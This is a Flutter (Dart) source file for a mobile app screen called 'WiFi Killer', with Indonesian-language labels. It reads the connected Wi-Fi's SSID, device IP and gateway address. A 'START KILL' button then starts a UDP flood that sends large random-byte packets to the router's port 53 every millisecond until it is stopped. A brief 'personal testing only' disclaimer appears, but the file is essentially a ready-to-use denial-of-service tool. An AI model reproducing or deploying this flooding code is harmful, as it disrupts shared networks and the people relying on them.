import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-"; // Placeholder, not supported by network_info_plus
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    // Request location permission
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-"; // Not available in network_info_plus
      });

      print("Router IP: $routerIp");
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("✅ Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: Colors.black,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Text(title,
            style: const TextStyle(
              color: Color(0xFF8B0000),
              fontSize: 18,
              fontWeight: FontWeight.bold,
              fontFamily: 'Orbitron',
            )),
        content: Text(message,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 16,
              fontFamily: 'ShareTechMono',
            )),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("OK", style: TextStyle(color: Color(0xFF8B0000))),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text("$label: ", style: const TextStyle(color: Colors.white70, fontWeight: FontWeight.bold)),
          Expanded(child: Text(value, style: const TextStyle(color: Colors.white))),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: const Color(0xFF8B0000),
        title: const Text("📡 WiFi Killer", style: TextStyle(fontFamily: 'Orbitron')),
      ),
      body: Padding(
        padding: const EdgeInsets.all(25),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              "WiFi Killer",
              style: TextStyle(
                color: Colors.redAccent,
                fontSize: 22,
                fontWeight: FontWeight.bold,
                fontFamily: 'Orbitron',
              ),
            ),
            const SizedBox(height: 10),
            const Text(
              "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n⚠️ Gunakan hanya untuk testing pribadi. Risiko ditanggung pengguna.",
              style: TextStyle(color: Colors.white70, fontSize: 14),
            ),
            const SizedBox(height: 20),
            Container(
              decoration: BoxDecoration(
                color: Colors.black54,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.redAccent.shade100),
              ),
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _infoRow("SSID", ssid),
                  _infoRow("IP", ip),
                  _infoRow("Freq", "$frequency MHz"),
                  _infoRow("Router", routerIp),
                ],
              ),
            ),
            const SizedBox(height: 40),
            Center(
              child: ElevatedButton.icon(
                onPressed: isKilling ? _stopFlood : _startFlood,
                style: ElevatedButton.styleFrom(
                  backgroundColor: isKilling ? Colors.grey : const Color(0xFF8B0000),
                  padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 15),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(25)),
                ),
                icon: Icon(isKilling ? Icons.stop : Icons.wifi_off),
                label: Text(
                  isKilling ? "STOP" : "START KILL",
                  style: const TextStyle(fontSize: 16, letterSpacing: 2, fontFamily: 'Orbitron'),
                ),
              ),
            ),
            const SizedBox(height: 20),
            if (isKilling)
              const Center(
                child: CircularProgressIndicator(color: Colors.redAccent),
              ),
          ],
        ),
      ),
    );
  }
}
